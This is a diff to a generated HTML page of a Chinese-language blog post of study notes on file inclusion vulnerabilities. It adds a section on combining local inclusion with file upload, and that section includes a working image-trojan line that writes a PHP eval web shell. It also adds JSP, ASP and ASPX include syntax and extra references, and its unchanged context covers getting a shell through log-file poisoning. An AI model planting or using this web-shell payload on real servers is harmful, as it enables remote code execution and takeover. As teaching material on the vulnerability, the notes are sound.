@@ -117,7 +117,7 @@
 <meta property="og:image" content="https://shu1l.github.io/2020/04/03/wen-jian-bao-han-lou-dong-xue-xi-bi-ji/9272355-f5d368a6f62b9802%5B1%5D.png">
 <meta property="og:image" content="https://shu1l.github.io/2020/04/03/wen-jian-bao-han-lou-dong-xue-xi-bi-ji/9272355-e094a1b3f7e98f45%5B1%5D.png">
 <meta property="article:published_time" content="2020-04-03T04:42:02.000Z">
-<meta property="article:modified_time" content="2020-04-27T11:35:27.876Z">
+<meta property="article:modified_time" content="2020-04-29T11:08:36.807Z">
 <meta property="article:author" content="Shu1L">
 <meta property="article:tag" content="文件包含漏洞">
 <meta name="twitter:card" content="summary">
@@ -603,7 +603,8 @@ POST:
 <li><p>条件： PHP &gt; =5.3.0，注意在windows下测试要5.3.0&lt;PHP&lt;5.4 才可以 #在浏览器中要编码为%23，否则浏览器默认不会传输特殊字符。</p>
 </li>
 </ul>
-<pre><code>index2.php?file=zip://C:\phpStudy\WWW\FileInclusion\phpinfo.zip%23phpinfo.txt</code></pre><h3 id="包含日志文件"><a href="#包含日志文件" class="headerlink" title="包含日志文件"></a>包含日志文件</h3><p>当我们没有上传点，并且也没有url_allow_include功能时，我们就可以考虑包含服务器的日志文件。<br>利用思路也比较简单，当我们访问网站时，服务器的日志中都会记录我们的行为，当我们访问链接中包含PHP一句话木马时，也会被记录到日志中。<br>这时候我们如果知道服务器的日志位置，我们可以去包含这个文件从而拿到shell。其实整个“包含日志文件漏洞利用”最关键的就是找日志存放的“物理路径”，只要找到日志的物理存放路径，一切就可以按部就班的完成利用了。<br>利用的条件：</p>
+<pre><code>index2.php?file=zip://C:\phpStudy\WWW\FileInclusion\phpinfo.zip%23phpinfo.txt</code></pre><h4 id="本地包含配合文件上传"><a href="#本地包含配合文件上传" class="headerlink" title="本地包含配合文件上传"></a>本地包含配合文件上传</h4><p>如果目标服务器关闭了allow_url_fopen，则可以尝试使用本地包含+文件上传<br>上传一个图片木马a.jpg，内容为：</p>
+<pre><code>&lt;?fputs(fopen(&quot;shell.php&quot;,&quot;w&quot;),&quot;&lt;?php eval($_POST[tzc]);?&gt;&quot;)?&gt;</code></pre><h3 id="包含日志文件"><a href="#包含日志文件" class="headerlink" title="包含日志文件"></a>包含日志文件</h3><p>当我们没有上传点，并且也没有url_allow_include功能时，我们就可以考虑包含服务器的日志文件。<br>利用思路也比较简单，当我们访问网站时，服务器的日志中都会记录我们的行为，当我们访问链接中包含PHP一句话木马时，也会被记录到日志中。<br>这时候我们如果知道服务器的日志位置，我们可以去包含这个文件从而拿到shell。其实整个“包含日志文件漏洞利用”最关键的就是找日志存放的“物理路径”，只要找到日志的物理存放路径，一切就可以按部就班的完成利用了。<br>利用的条件：</p>
 <ul>
 <li>1.日志的物理存放路径</li>
 <li>2.存在文件包含漏洞</li>
@@ -652,9 +653,20 @@ POST:
 <p>利用条件：需要知道ssh-log的位置，且可读。默认情况下为 /var/log/auth.log</p>
 <p>姿势：<br>用ssh连接：<br><a href="https://www.jianshu.com/p/7cbc878d64ae" target="_blank" rel="noopener">参考这个网站</a></p>
 <h5 id="包含临时文件"><a href="#包含临时文件" class="headerlink" title="包含临时文件"></a>包含临时文件</h5><p><a href="https://vulhub.org/#/environments/php/inclusion/" target="_blank" rel="noopener">参考这个网站</a></p>
-<hr>
+<h4 id="jsp文件包含漏洞"><a href="#jsp文件包含漏洞" class="headerlink" title="jsp文件包含漏洞"></a>jsp文件包含漏洞</h4><p>include</p>
+<pre><code>&lt;%@ include file=&quot;head.jsp&quot;%&gt;
+&lt;%@ include file=&quot;body.jsp&quot;%&gt;
+&lt;%@ include file=&quot;tail.jsp&quot;%&gt;</code></pre><p>jsp:include</p>
+<pre><code>&lt;jsp:include page=&quot;head.jsp&quot;/&gt;
+&lt;jsp:include page=&quot;body.jsp&quot;/&gt;   
+&lt;jsp:include page=&quot;tail.jsp”/&gt;</code></pre><p>采用JSTL</p>
+<pre><code>&lt;c:import url=&quot;http://thief.one/1.jsp&quot;&gt;</code></pre><h4 id="asp文件包含漏洞"><a href="#asp文件包含漏洞" class="headerlink" title="asp文件包含漏洞"></a>asp文件包含漏洞</h4><p>asp貌似无法包含远程文件（iis安全设置），只能包含本地文件，语法如下：</p>
+<pre><code>    &lt;!--#include file=&quot;1.asp&quot; --&gt;</code></pre><h4 id="aspx文件包含漏洞"><a href="#aspx文件包含漏洞" class="headerlink" title="aspx文件包含漏洞"></a>aspx文件包含漏洞</h4><p>aspx文件包含与asp一样，语法如下：</p>
+<pre><code>    &lt;!--#include file=&quot;top.aspx&quot; --&gt;</code></pre><hr>
 <h5 id="参考文章："><a href="#参考文章：" class="headerlink" title="参考文章："></a>参考文章：</h5><p><a href="https://www.jianshu.com/p/8803aff98bfa" target="_blank" rel="noopener">https://www.jianshu.com/p/8803aff98bfa</a></p>
 <p><a href="https://www.freebuf.com/articles/web/182280.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/182280.html</a></p>
+<p><a href="https://blog.csdn.net/God_XiangYu/article/details/97335988#asp文件包含漏洞" target="_blank" rel="noopener">https://blog.csdn.net/God_XiangYu/article/details/97335988#asp%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E</a></p>
+<p><a href="https://thief.one/2017/04/10/2/" target="_blank" rel="noopener">https://thief.one/2017/04/10/2/</a></p>
 
       
     </div>
@@ -695,8 +707,8 @@ POST:
 
           <div class="post-nav-prev post-nav-item">
             
-              <a href="/2020/04/03/ti-quan-fang-shi-zong-jie/" rel="prev" title="提权方式总结">
-                提权方式总结 <i class="fa fa-chevron-right"></i>
+              <a href="/2020/04/03/windows-chang-jian-ti-quan-fang-shi-zong-jie/" rel="prev" title="纵观渗透测试中的提权">
+                纵观渗透测试中的提权 <i class="fa fa-chevron-right"></i>
               </a>
             
           </div>
@@ -778,7 +790,7 @@ POST:
               
                 <a href="/archives">
               
-                  <span class="site-state-item-count">41</span>
+                  <span class="site-state-item-count">46</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -789,7 +801,7 @@ POST:
               
               <div class="site-state-item site-state-categories">
                 <a href="/categories/index.html">
-                  <span class="site-state-item-count">7</span>
+                  <span class="site-state-item-count">8</span>
                   <span class="site-state-item-name">分类</span>
                 </a>
               </div>
@@ -833,7 +845,7 @@ POST:
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#文件包含漏洞学习"><span class="nav-number">1.</span> <span class="nav-text">文件包含漏洞学习</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#文件包含漏洞相关知识点"><span class="nav-number">1.0.1.</span> <span class="nav-text">文件包含漏洞相关知识点</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#什么是文件包含？"><span class="nav-number">1.0.1.1.</span> <span class="nav-text">什么是文件包含？</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#文件包含函数"><span class="nav-number">1.0.1.2.</span> <span class="nav-text">文件包含函数</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#漏洞产生的原因"><span class="nav-number">1.0.1.3.</span> <span class="nav-text">漏洞产生的原因</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#分类"><span class="nav-number">1.0.2.</span> <span class="nav-text">分类</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#本地文件包含漏洞"><span class="nav-number">1.0.3.</span> <span class="nav-text">本地文件包含漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#一、无限制本地文件包含漏洞"><span class="nav-number">1.0.3.1.</span> <span class="nav-text">一、无限制本地文件包含漏洞</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#二、session文件包含漏洞"><span class="nav-number">1.0.3.2.</span> <span class="nav-text">二、session文件包含漏洞</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#三、有限制本地文件包含漏洞绕过"><span class="nav-number">1.0.3.3.</span> <span class="nav-text">三、有限制本地文件包含漏洞绕过</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#远程文件包含漏洞"><span class="nav-number">1.0.4.</span> <span class="nav-text">远程文件包含漏洞</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#PHP伪协议在文件包含中的应用"><span class="nav-number">1.0.5.</span> <span class="nav-text">PHP伪协议在文件包含中的应用</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#php-input"><span class="nav-number">1.0.5.1.</span> <span class="nav-text">php:&#x2F;&#x2F;input</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#php-input-（读取POST数据）"><span class="nav-number">1.0.5.2.</span> <span class="nav-text">php:&#x2F;&#x2F;input （读取POST数据）</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#php-input-命令执行"><span class="nav-number">1.0.5.3.</span> <span class="nav-text">php:&#x2F;&#x2F;input(命令执行)</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#data-伪协议"><span class="nav-number">1.0.5.4.</span> <span class="nav-text">data:&#x2F;&#x2F;伪协议</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#phar伪协议"><span class="nav-number">1.0.5.5.</span> <span class="nav-text">phar伪协议</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#zip：-伪协议"><span class="nav-number">1.0.5.6.</span> <span class="nav-text">zip：&#x2F;&#x2F;伪协议</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#包含日志文件"><span class="nav-number">1.1.</span> <span class="nav-text">包含日志文件</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#SSH-log"><span class="nav-number">1.1.0.1.</span> <span class="nav-text">SSH log</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#包含临时文件"><span class="nav-number">1.1.0.2.</span> <span class="nav-text">包含临时文件</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#参考文章："><span class="nav-number">1.1.0.3.</span> <span class="nav-text">参考文章：</span></a></li></ol></li></ol></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#文件包含漏洞学习"><span class="nav-number">1.</span> <span class="nav-text">文件包含漏洞学习</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#文件包含漏洞相关知识点"><span class="nav-number">1.0.1.</span> <span class="nav-text">文件包含漏洞相关知识点</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#什么是文件包含？"><span class="nav-number">1.0.1.1.</span> <span class="nav-text">什么是文件包含？</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#文件包含函数"><span class="nav-number">1.0.1.2.</span> <span class="nav-text">文件包含函数</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#漏洞产生的原因"><span class="nav-number">1.0.1.3.</span> <span class="nav-text">漏洞产生的原因</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#分类"><span class="nav-number">1.0.2.</span> <span class="nav-text">分类</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#本地文件包含漏洞"><span class="nav-number">1.0.3.</span> <span class="nav-text">本地文件包含漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#一、无限制本地文件包含漏洞"><span class="nav-number">1.0.3.1.</span> <span class="nav-text">一、无限制本地文件包含漏洞</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#二、session文件包含漏洞"><span class="nav-number">1.0.3.2.</span> <span class="nav-text">二、session文件包含漏洞</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#三、有限制本地文件包含漏洞绕过"><span class="nav-number">1.0.3.3.</span> <span class="nav-text">三、有限制本地文件包含漏洞绕过</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#远程文件包含漏洞"><span class="nav-number">1.0.4.</span> <span class="nav-text">远程文件包含漏洞</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#PHP伪协议在文件包含中的应用"><span class="nav-number">1.0.5.</span> <span class="nav-text">PHP伪协议在文件包含中的应用</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#php-input"><span class="nav-number">1.0.5.1.</span> <span class="nav-text">php:&#x2F;&#x2F;input</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#php-input-（读取POST数据）"><span class="nav-number">1.0.5.2.</span> <span class="nav-text">php:&#x2F;&#x2F;input （读取POST数据）</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#php-input-命令执行"><span class="nav-number">1.0.5.3.</span> <span class="nav-text">php:&#x2F;&#x2F;input(命令执行)</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#data-伪协议"><span class="nav-number">1.0.5.4.</span> <span class="nav-text">data:&#x2F;&#x2F;伪协议</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#phar伪协议"><span class="nav-number">1.0.5.5.</span> <span class="nav-text">phar伪协议</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#zip：-伪协议"><span class="nav-number">1.0.5.6.</span> <span class="nav-text">zip：&#x2F;&#x2F;伪协议</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#本地包含配合文件上传"><span class="nav-number">1.0.6.</span> <span class="nav-text">本地包含配合文件上传</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#包含日志文件"><span class="nav-number">1.1.</span> <span class="nav-text">包含日志文件</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#SSH-log"><span class="nav-number">1.1.0.1.</span> <span class="nav-text">SSH log</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#包含临时文件"><span class="nav-number">1.1.0.2.</span> <span class="nav-text">包含临时文件</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#jsp文件包含漏洞"><span class="nav-number">1.1.1.</span> <span class="nav-text">jsp文件包含漏洞</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#asp文件包含漏洞"><span class="nav-number">1.1.2.</span> <span class="nav-text">asp文件包含漏洞</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#aspx文件包含漏洞"><span class="nav-number">1.1.3.</span> <span class="nav-text">aspx文件包含漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#参考文章："><span class="nav-number">1.1.3.1.</span> <span class="nav-text">参考文章：</span></a></li></ol></li></ol></li></ol></li></ol></div>
             
 
           </div>
